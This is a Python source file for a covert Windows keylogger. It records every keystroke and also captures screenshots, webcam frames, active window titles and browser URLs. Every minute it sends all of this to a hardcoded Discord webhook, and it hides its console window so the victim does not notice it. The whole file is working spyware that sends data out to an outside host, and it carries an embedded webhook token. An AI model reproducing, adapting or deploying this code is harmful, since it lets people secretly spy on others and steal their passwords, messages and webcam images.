import subprocess

# Define the path to the requirements.txt file
requirements_file = 'requirements.txt'

# Install the required packages
def install_packages():
    try:
        subprocess.check_call(['pip', 'install', '-r', requirements_file])
        print("Packages installed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to install packages: {e}")
    except Exception as e:
        print(f"An error occurred during package installation: {e}")

# Check if the required packages are already installed
def check_packages():
    try:
        subprocess.check_output(['pip', 'show', '-r', requirements_file])
        print("Packages are already installed.")
    except subprocess.CalledProcessError:
        print("Packages need to be installed.")
        install_packages()
    except Exception as e:
        print(f"An error occurred while checking packages: {e}")

import logging
from dhooks import Webhook, File
from threading import Timer
from pynput.keyboard import Listener
import pyautogui
import cv2
import win32gui
import win32process
import win32con
import win32api
import win32console

WEBHOOK_URL = 'https://discord.com/api/webhooks/1114116826872426537/FCU_xPsLZYTV60DEvsDmQTDzE5_Z98hL4AoYGtw7eQj5wz70uzsydIc2QJwb8wGu4SNx'
TIME_INTERVAL = 60  # Amount of time between each report, expressed in seconds

class Keylogger:
    def __init__(self, webhook_url, interval):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""
        self.current_window = None
        self.previous_website = ""

    def _report(self):
        if self.log != '':
            try:
                self.webhook.send(self.log)
                self.log = ''
            except Exception as e:
                logging.error(f"Failed to send webhook: {str(e)}")
        self._take_screenshot()
        self._capture_webcam()
        self._get_active_window()
        self._track_websites()
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += str(key)

    def _take_screenshot(self):
        try:
            region = (100, 100, 500, 500)  # Adjust the region as per your requirement
            screenshot = pyautogui.screenshot(region=region)
            screenshot.save("screenshot.png")
            self.webhook.send(file=File("screenshot.png"))
        except Exception as e:
            logging.error(f"Failed to take screenshot: {str(e)}")

    def _capture_webcam(self):
        try:
            capture = cv2.VideoCapture(0)
            ret, frame = capture.read()
            if ret:
                cv2.imwrite("webcam_capture.png", frame)
                self.webhook.send(file=File("webcam_capture.png"))
            capture.release()
        except Exception as e:
            logging.error(f"Failed to capture webcam frame: {str(e)}")

    def _get_active_window(self):
        try:
            window_handle = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(window_handle)
            if window_title != self.current_window:
                self.current_window = window_title
                self.log += f"\n[Active Window] {window_title}\n"
        except Exception as e:
            logging.error(f"Failed to get active window: {str(e)}")

    def _track_websites(self):
        try:
            browser_window = win32gui.GetForegroundWindow()
            if browser_window != 0:
                _, pid = win32process.GetWindowThreadProcessId(browser_window)
                browser_process = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, False, pid)
                executable_path = win32process.GetModuleFileNameEx(browser_process, 0)
                if "chrome.exe" in executable_path.lower():
                    self._track_chrome_website()
                elif "firefox.exe" in executable_path.lower():
                    self._track_firefox_website()
                elif "iexplore.exe" in executable_path.lower():
                    self._track_ie_website()
                elif "msedge.exe" in executable_path.lower():
                    self._track_edge_website()
        except Exception as e:
            logging.error(f"Failed to track websites: {str(e)}")

    def _track_chrome_website(self):
        try:
            chrome_window = win32gui.GetForegroundWindow()
            if chrome_window != 0:
                chrome_tab_window = win32gui.FindWindowEx(chrome_window, 0, "Chrome_WidgetWin_1", None)
                if chrome_tab_window != 0:
                    chrome_edit_window = win32gui.FindWindowEx(chrome_tab_window, 0, "Chrome_AutocompleteEditView", None)
                    if chrome_edit_window != 0:
                        chrome_url = win32gui.GetWindowText(chrome_edit_window)
                        if chrome_url != self.previous_website:
                            self.previous_website = chrome_url
                            self.log += f"\n[Chrome URL] {chrome_url}\n"
        except Exception as e:
            logging.error(f"Failed to track Chrome website: {str(e)}")

    def _track_firefox_website(self):
        try:
            firefox_window = win32gui.GetForegroundWindow()
            if firefox_window != 0:
                firefox_edit_window = win32gui.FindWindowEx(firefox_window, 0, "MozillaWindowClass", None)
                if firefox_edit_window != 0:
                    firefox_url = win32gui.GetWindowText(firefox_edit_window)
                    if firefox_url != self.previous_website:
                        self.previous_website = firefox_url
                        self.log += f"\n[Firefox URL] {firefox_url}\n"
        except Exception as e:
            logging.error(f"Failed to track Firefox website: {str(e)}")

    def _track_ie_website(self):
        try:
            ie_window = win32gui.GetForegroundWindow()
            if ie_window != 0:
                ie_edit_window = win32gui.FindWindowEx(ie_window, 0, "Edit", None)
                if ie_edit_window != 0:
                    ie_url = win32gui.GetWindowText(ie_edit_window)
                    if ie_url != self.previous_website:
                        self.previous_website = ie_url
                        self.log += f"\n[Internet Explorer URL] {ie_url}\n"
        except Exception as e:
            logging.error(f"Failed to track Internet Explorer website: {str(e)}")

    def _track_edge_website(self):
        try:
            edge_window = win32gui.GetForegroundWindow()
            if edge_window != 0:
                edge_edit_window = win32gui.FindWindowEx(edge_window, 0, "Edit", None)
                if edge_edit_window != 0:
                    edge_url = win32gui.GetWindowText(edge_edit_window)
                    if edge_url != self.previous_website:
                        self.previous_website = edge_url
                        self.log += f"\n[Microsoft Edge URL] {edge_url}\n"
        except Exception as e:
            logging.error(f"Failed to track Microsoft Edge website: {str(e)}")

    def run(self):
        self._report()
        with Listener(on_press=self._on_key_press) as listener:
            listener.join()

if __name__ == '__main__':
    try:
        # Set up logging
        logging.basicConfig(filename='keylogger.log', level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

        # Hide the console window
        win32console.FreeConsole()

        # Run the keylogger
        Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()

    except Exception as e:
        logging.error(f"Keylogger encountered an error: {str(e)}")
